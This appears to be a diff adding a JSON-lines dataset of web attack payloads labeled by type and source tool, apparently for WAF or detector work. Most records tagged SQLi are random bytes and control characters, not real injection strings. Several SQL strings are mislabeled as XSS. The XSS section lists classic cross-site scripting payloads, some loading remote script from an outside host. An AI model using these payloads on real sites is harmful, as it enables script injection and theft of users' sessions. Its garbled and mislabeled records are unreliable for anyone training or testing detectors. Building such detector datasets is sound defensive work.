+{"payload": "\u0006U\u0007%dDtOؤԥυJgS}ptG3n\tHx~r'Y7vwBQ@\u0003o5\b\u0012Ğ$\u00149EH<4\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0005c*.\u0005B5|A\u0016\u001b--K\u0010W7\u0014cM[\u0006\u0018f\u0019`\u000eV;M\u0016L\u001a_`;P\b\th\u0015]nƘ`pS-\u00164@.E\u00006", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001b\\\u00178ad{\u001adtiߤ7D}֝EE%\u0007\u0001e\u0004插h\u0006HHjY7%d8c6J\u0018JuA\u001fe2+BƂ.\u0006ea}]zq`B?}y\u0018JK:U%\u001a\u001ajS-\u0001u\u0011\u0007/Ҧ*qZSqMe+\u0010Ea\u0012w", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "72&w1L\"!4~;%1c\u00196#}l^ڞ'hv5\u0007<МJ\u0015\u001b4R04\u0001AT˯=\u0019\u0013a9y2 W\u0003\u0016\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "i\u0004\"--mC\u001f6~.ߢ呿_,aq#?_RD\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "pWz\u0011--a!uVVݽyS\"UBoᢢߞv\u0015Rp^Z\\\u0006ΎhV+ަP\u0004^h\u001a7\u0014ﺦ\u0012k-j\b<񽙴eֻ{U\t_KUPA!wi\u000fhwhITKGv\u001f*hݥpH", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "yծ=%f9\u0019hd\u000f%z@wR\u000eV", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Lv\u00050vym\\|\u001a\u0007iU-->|ugZE\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "SBbGnXH3cYb\u00045D%93b5[\u0016B", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "B%E2\u00191Qɋ~tL\u0011\u0013$O8\t\u0019u\u0019", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "l\u0019J\u0005\\\u0005&@\u00150\u0005)\u0015te%FD&0ɯUY)9\u0017", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "O\u0002yF\u0002L0&wbæ]w\\ױaqQt\u0019яL\u0013Av(g+f\u001fȡ%0a{d]ӝVSKg#]jRjrXwhwM\u0018Pw<x\\\u0002̕h9-B", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<%D5MQ{\u0016\bY\u000eU", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "u:\u0000\u0019%eEeD\u001b\u001b(0w\u0005\"7", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "W7oђb!м֌r\u0012s|*\u0014Sr8\\*e\\b|LN `>Y.%0dx۽@5", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ϲz]4_tbKvcT׮ɵQr]DG--@\u0019o\u0018qEy-se^ߵ|\u001f~U׳ywU7\u0001C25]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "L*\u00134PMj`D5L\u0001[\"\u00043\u001bǍE˸O\u0016[\u0016;fKb).LPuv);2)-Wav~@J#5Z\u0019\\31\u0017\u00017+ѬXͫG\u0004e4eͮ)\u001aٱU\u000f2\u001bIz\u0016\t]}ET\u0002\u0015v,K\\g--\bC\bD", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "}6Yw\u000f_FH\"\u0000m\u0001,ٽU32\u0018--ȫ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0016E\"\u0013v_%+5/7$tNz\u0000\u0007\u0017A,ΎbcJ9:h\\\">-V]lЦL|\u0011eKrCݿ\\\u0016%3ESmI~*[T2{\u001795RDz\u0019&\u001an7~-+O\u0019A.oRlX\u0000&S", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "xF2\u0002>5%557\u00000<%\u0000O܆\t24f/*:4OoS\u001aҔ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "64h.3\u000fE%46X", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "E\u001f9\u0018P;ڳ\u000eY\"a݅l-\u0010E֧ v\b\u0010Dm82\bjRY!\\k#%64\"!1#\"9", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "]aZk@et\u001f8^n!o_q{%eeV2؜J$zJ9xs̗C)z{CLf#:52/}ʙkX\u0012C&G\u0017\u0019`\u0005mI+\u001fr_˒0i.Ù\u0000\u0004gk", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$\u0015r\"'0A;x\tP\u0011@(>0\u00046%~^nBey-R=\u0015H\u0010A%9d5\u0011IO=\u0001\u0013S-aB\u001ai|Xo\u0017(Qz!0\u000e\"yY7#g(\tQ\u0011M*H3Ԝr\u0001FK\u000fΎNZhͳfϔo\u00169Iē@\u0014D", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ",=<--+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "K/z\"J\u0003kKH#e%f6Gb\u0007\u0016\u0019@6gɵxlF\t\u000eԧxߩ?\u0012*UQm\u0003mhl1sg[.d<\u0005ĥXx;&Zr4m}т\u0000\u000e=ٝبifJ\u0007Jm\u001bM\u00186\u0015f%Ed", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Y}r%c1iT%{ ^\bB`\u000f[lmaG2E8Eٲ5,!qlo\u0007*q~\t( l\u000f\u001bm`_<pb1˓Mo0~\u000e6X@W՟Y658/,\u0017`BQk\u0012(W\t6k|)v/\u0015~nt,珘6)ZmA7\u001b\u001f\u0016", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0010faR\u0016]\u001bm\u0018]fR\u0002ZC6\\)6\u0017\u0010v\u00056{ݩM_yEd,uW7D%Wy3R]`RP\u0000A\u0012R\u0005%4A;O\u0002\bƐ%&/vum[9Pb6wFJvۄ\u0015d\u0011,Y_r~O", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Df+\u0013+!.'p\u0007\u0000j?\u0015s\u0004Wv\u0001\u000fCR]5x1J%D8\u0017ʧy/Ps>Q]", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017w\u0010q@hh@qdaM_%72j+'A1ե%}u", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "5)[k\u0003'\u0004\u000e\u0000%bA\u0005Ak\u0012\u0013tF<\u0001J4Ċ}X{H̹ވyIi6p6\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "]ˀ]u%e4V4Vtjeke'\u0014coK;jԥY\u0015\bA1WT6+$ԍg1w1\u0010i`H\bܿqG", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "y\u0013j\u0005+lt$[jBµ!\u001a|\b'G%AD4\u0001\u001b\u0014wD\u0019\u0015\u0016hk\u0018HDUJPcw\u0002\u0002_1\tf\u0014Ù{H\u0003F5zKCy]Q#ʹH\u0016y;Tien9lE\u0002oD,[\u0019\u0019li\\7[U", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "s23\u0013:i+\u0006ѐ|\u00115FDGQqѸ%D4$|&;YdsMb\u0014u+\u0015\"7:jn1׫|Yx%U\u0001t~8)Hͦ,6\u0012~²_n(σ$&7&M  ꑄ\bs", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ٛ\u0015\u0006>8}\u0016Ү\u0010\tft\u0012%F0ʷzָo%3#\u0006?ǭV", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "n+IEuN,(eC;Ѻ_8LeHK_r+{\u0012g$^^\u0002%5DU\u000eqdm", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "_\u001b@@FF_2\u0004MBf\u0017--jx=\u0017[46xP.=o\bh\u001fV", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Z\u0011l,;%aeM\u0018@ܚL%lZ\tDCƋw5\u00065ut3\t#3>SKy\u0014\"\u0018[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "0m\b\b8AQ\u00063~G\u0010&\u0011ï\u001aF%Da+B`;\t%H^\u0000Sj", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "QAL\u0000aƍ\bc\u0006E\u00023Y!w(j|\u0004bqeyPe}<KaM\u001fw\u0019\u0017\u0013GRp?a?zEg:}*/SrHN:g(n\tտ>%29W\u00121\u0010| \u0015w;^vW\u0001<.҇_ {/Z˴BR/\u0007d|\u001aW^,\u0011_T/8{C0A", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "G\u0019&r,w%B9\\kDƒ\u0010\u0013=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "%\u0002Q\u0000\b(fpj\u0007oE9hӍB𲆟2OaPfS\"2x8&%c1|\u000fKL", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Ś%ac,s?`3\"u!t6Zq\u0006&\u0004G|Cݙfoe\u0010\u0014@0^", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "9oN܎ŋ5\bUYExTn{.zE7%69F?铩)8*\u0017r}r\u0011<='#5&+", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "TSr8aFRTEr)8Cy.\u0011\u0006\u0011bs_l`dd4D \u0019x漇\u001bq\u00118ClZH\b0\u0019yC#6Alsx\u001bjke\bՌ\u000fFHT\u0017!\u000e'#idkD\u001a>K$WUFci0e\u0005T[d;\"^~\u0007DF\\da\u0019uE HZv+G-\bd\u0006xDhSu}1Yx,%CFv_^ZwI\u0004g=DC\u0013\\ן~!O/v_BPX", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0013\u0013\u001aKdgdoD$-wF\u0016tyziN%4b\u000f\u00190 =1\tͿ\u0014:\u0015J\u0006KQ\u0007", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "H\u000f7\u001fǇ<\u0004vN\u0006u\\LoRƺh*&\u0001W:0%02jMX,/m\u0006c\u001a[\u0016h\u0015f3b`X\u0005", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u001aV$Bckٱ}-q'\u0018^'h\u000e!KQҼ5<*K6\u0005\u001f'}Cyj\tz:{4'ܳYVĜ\u0004χ'T\u0016\u0010\u001arn;\u0011j\u0011{\u0004\u0002Ծ#\u001b\u0001^%A9{:uI~WSh1\u000f5ɴһ\u0014nb5b=", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "gRL3D+]\u0019b5w\\K0+\u001a pZ\\{6:[q$m-%CEv&B$X}ؐh\u0011p(]סz9\u001a", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "n)\u000fz\u001a5%A5_7\u0011٪:1X0\u0006T\u0001A\u0001j\u0017EhUZS/@ 2\u0010\u0018D\u0017q\u001bǶnEq=|Pn\u001b\u0002\u001au¿CyE", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "?o--\u0003KJۓA\u0010XJK\u0016Gˊc\\", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "1U\u0016Lc\u00064\u0017r\u0011%4BW}sը\u000fRB^\u0019ư\u001a\bBIXn<jŴ31Weu6iu̙҂BYok̆p)s\u0015-fXӄmt\u001a\u0002.4}\u001aRgQP5_\u0004bՈ!E8b\u0007]XM0F\u0018O\u0016ނ}*Abs룄hir\u001f!", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "$\"Y%Ř,%|Hc%4B,.3_@{1 z\tϡ0\u0003/`\u0003\u0012QK\\>Ƚ\\ʗfU|'\u0003*{փ4u\u0017<?KU\u00067", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "HO08\u0002XD%PJ-&\u0000dsDƕTO%BFR9&", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "ST\u0005\u0006d\u0011\u00052ډ\t\u0002\u001aϔ7I\u0016$R\u0015\u0017E]%5c|\tahlR\u0014\u0014p̃h\u00072jU?VXWVXv", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "Af%8DU~ћ7WY*\u00071{\u0015<kY", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": ".DB1HƦID=&Kݚi9}euB\u0006F8\u0001>f%bBƝ-0\u001a\u0011뒹>\u0000\bE\u0012r+[\u0019L\u0010pg[bavցS\u0014Zj\u0018f巳\u000e98\u0004DNc6\u0018Fl\u0007(}5:4\u000e>M\u0001;RoJ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "[[ln\ts--{\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "^D\u0005Q9M$\"3WP6IE)TRc\u0005Y\u0013\\:\u0019\u0018p\u0014JYt\u0004Y2\u0001iE[\u0000.='0RG$%'Ւn}e\u0019?#%ea6@S/J{PޛczCfym\u0010:g\u0001l\"\u0004FI9IX]V<%\u000eil]|", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "u>{\u0004Cb\"%0cpO|\u0015xޤPVΞch'\u0002HzM<1OA4ʱI\u0003=\u0013eф!&\u0002T#ˈp\u0005#2L'!R-iy!\u0015$!ݛ-Ͱi}̅\u0003kPJ\u0004.rϤ\u0004N'O-yhǫiI8V+zg4V", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0010a\u0015O\u0019\u0001\t3%\u000fW%\u000fP!!\u0007>A`\u001ft3g%32e A\u001fqX\u0001TJ\u001b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "t\u0010\u001a\u0006\u0003`0č&簃zw\u0017X\u0001!r6I\u0014\u0017$*iI\u0002\u0014Mҋ{2%f4MjlخIYI&\u0003<Z(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "8\u00167穋\u0012X7--mh", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "c'K\u000e4\u0018\u001bgڏtn}J\u0019wt\\\u001ah\u0016%t﷞V\u0000תb\u0005ώ\t\u001b\b\u000eyd\u00021?eeS8*D NG2P#ue^}Vqv2!M`[n?\u001fli\u001a7<\u0013\u0016BF\u00063VQ{s\u0003t:\u000fBS\u001aq\bI>XhpYB&8hʖV\u0004b\u0015Pu%\u0016\u000f\u0000@yo\u0018Ŭ5y\u0016-{5b\u0000N\u000fG=$O4Q\\!y.=yVkO\u0015H\u0013FQ>H\u001377c\u000fѾ\tzT*\u0014Dao_8Υ\\\u0010`˃}\u0011++?\u0017l/n3gEQM\u0004x*\u0015%g=+\u0002<g&8i}!=*D\u00176E\u0000by_l\u0012.^P e=\u0005%bA@\"\u0016B\u000ey\\ц\u001fNW$/ua\"\u0004w\u0002-RUH؝ܱחKląEL'\t\u000e嵾G\u0011V {ޫ.!V\u000eaKE(9-M'.\u0012\u0013yt\u0017\u0001IdVJndؼJ?Qћ3", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "T\u0010l8Kl\t~g\u0015\u0013hBXi&\b\u0006n\u0005i|*u`cΒ\u0012W3\u001a\u0017--+\u001a\u0017\"u۞1mk5wM-q-|c4v&c%2E\u0006\u0006bgQ34vh8'͹]x={ZfiClmZ\u0016\u0015`״:h/F6", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "~--\u001a^sv;ޭ&V(\u00170/6DײT}帵<mZ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\b\u0004^\u0014'p7{4\u0005QWh\u000e\u001bHoFD/J\bp|D]Hg|/!\"}3\u0002--\u0003c\br@\u0014R[", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0011U>L\u0013>/SOW`*Y!cA\u0000C=ŔI\u0019WNă~\u0002J.s,\u0002\u000e)Ke\"K%70\u0001'c\u0007Z=P6܅\u0014d۳+2\u0002fJ*1u\u0014X\u001fb+מwmhWtMR'iPz}\u0004_\u0017a|\u0006Q\u0000", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "I\u0010%6?4*'K\t8V\u0007H$J\u0017l+SMukDҿ3!jh\u0000{q``A\u0013_9\\ L3ev\u0005X3\u0006B\u0007\u0018=y$\u0006UG%4D(g'SL\u0007s=\u0001", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "x.JHj\u0014MF|5ܲ\u0011\u001f<PE,\u00017_LX\u0003\txpd:9 lJ$\u0011P0Hi%EA5 ejQC\u0003", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "AAg\u0016\u0002\u0010:8Ȼ'@G8=\u001a[3\u001aqN;Iy\u0011elĄ1X2u\u0013 q~~\u00128Z+QgP\u0019;%61KM@^\u0005@b", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "RPȍ}Ne\b?qɕ%IK>\u0001V\u0012UL))e\txJy\"|26؞doyry퓹D>ͩ\u0014?\u0000=b+%3dx  r7\u0012I-\u0005lA\u0017\u0012\u0013E\u0013,AI;/!2%&%6F!<\u0019:\td&JP\"r", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0015tw&>\u000f_\u0001t\u0001ƽEoA\u0004!Ǭ;ҡ10C{aCee%48ێ8:\u001b\u000f", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "\u0017nb\bؿC_/\u0010z|%A2_\u0019yߩ(dj\u0001\u00046Ƣi", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "/n[\u0001w;}2@UrpRSH%c2kvKDz53W8+ՁG\u000fB^Q/9HǛsB*ۿ", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "OH\u0018K6\u0013ܸC>#Ir\u001fw^qdL{'#˂\u0000K\u0014ɤ\u0006GHz)a\u0011g*\t\u0007\u0004X@sF\u0019u\u0011'ؾ)x\u0006\u0002\u0012A3df\u0019y\u0003Zg\u000em\u001arYcP_k B9\u0016zY%N4.Lk\u001b%06\u0017J̴ü", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "T*^--", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "| gϩvqm/`5\u0013_c\u00129\u0017\u0002J\u0005\u0000qPdc)-%{I%C8\u0005o5\u0005\u000ff(", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "tMt)<B\u0001OM*0qy\u0011\u00141h:+tAչE\u001aTnO.x--A\u0012\u0001\u0015.x\u001b=\b\u000709\u000052;Xܺ8ejD\bB\u001bk\u0010NǋMI{", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<x`t%F6\u000e", "attack_type": "SQLi", "source": "sqlmap"}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<scRipt>alErt(1)</scrIpt>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<script type=vbscript>MsgBox(0)</script>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "a'or 2=2--", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=javascript:alert(\"XSS\")>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=JaVaScRiPt:alert(\"XSS\")>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BODY ONLOAD=alert(\"XSS\")>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"   javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BODY BACKGROUND=\"javascript:alert(\"XSS\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG DYNSRC=\"javascript:alert(\"XSS\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<INPUT TYPE=\"image\" DYNSRC=\"javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BGSOUND SRC=\"javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<br size=\"&{alert(\"XSS\")}\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"vbscript:msgbox(\"XSS\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"mocha:[code]\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"livescript:[code]\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IFRAME SRC=javascript:alert(\"XSS\")></IFRAME>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<FRAMESET><FRAME SRC=javascript:alert(\"XSS\")></FRAME></FRAMESET>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<TABLE BACKGROUND=\"javascript:alert(\"XSS\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<DIV STYLE=\"background-image: url(javascript:alert(\"XSS\"))\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<DIV STYLE=\"width: expression(alert(\"XSS\"));\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<STYLE>@im\\port\"\\ja\\vasc\\ript:alert(\"XSS\")\";</STYLE>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG STYLE=\"xss: expre\\ssion(alert(\"XSS\"))\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<STYLE TYPE=\"text/javascript\">alert(\"XSS\");</STYLE>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<XML SRC=\"javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "\"> <BODY ONLOAD=\"a();\"><SCRIPT>function a(){alert(\"XSS\");}</SCRIPT><\"", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT SRC=\"http://xss.ha.ckers.org/xss.jpg\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"javascript:alert(\"XSS\")\"", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT a=\">\" SRC=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT =\">\" SRC=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT a=\">\" \"\" SRC=\"http://xss.ha.ckers.org/a.js\"></SCRIPT><SCRIPT \"a=\">\"\" SRC=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<A HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D>link</A>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<A HREF=\"javascript:document.location=\"http://www.google.com/\"\">link</A>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BASE HREF=\"javascript:alert(\"XSS\");//\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=# onmouseover=\"alert(\"xxs\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC= onmouseover=\"alert(\"xxs\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG onmouseover=\"alert(\"xxs\")\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"jav&#x09;ascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"jav&#x0A;ascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\"jav&#x0D;ascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<IMG SRC=\" &#14;  javascript:alert(\"XSS\");\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<SCRIPT SRC=//ha.ckers.org/.j>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "\\\";alert(\"XSS\");//", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "</script><script>alert(\"XSS\");</script>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<table background=\"javascript:alert(1)\"></table>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<svg/onload=prompt(1);>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<isindex action=\"javas&tab;cript:alert(1)\" type=image>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<details ontoggle=alert(1)>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<div contextmenu=\"xss\">Right-Click Here<menu id=\"xss\" onshow=\"alert(1)\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<body style=\"height:1000px\" onwheel=\"prom%25%32%33%25%32%36x70;t(1)\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<div contextmenu=\"xss\">Right-Click Here<menu id=\"xss\" onshow=\"prom%25%32%33%25%32%36x70;t(1)\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<body style=\"height:1000px\" onwheel=\"alert(1)\">", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<script", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<script></script>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "<script>", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "abc' --", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "union select", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "union/**/select", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "uNion(sElect)", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "union all select", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "union/**/all/**/select", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "uNion all(sElect)", "attack_type": "XSS", "source": "wafninja"}
+{"payload": "%55nion(%53elect 1,2,3)", "attack_type": "XSS", "source": "wafninja"}
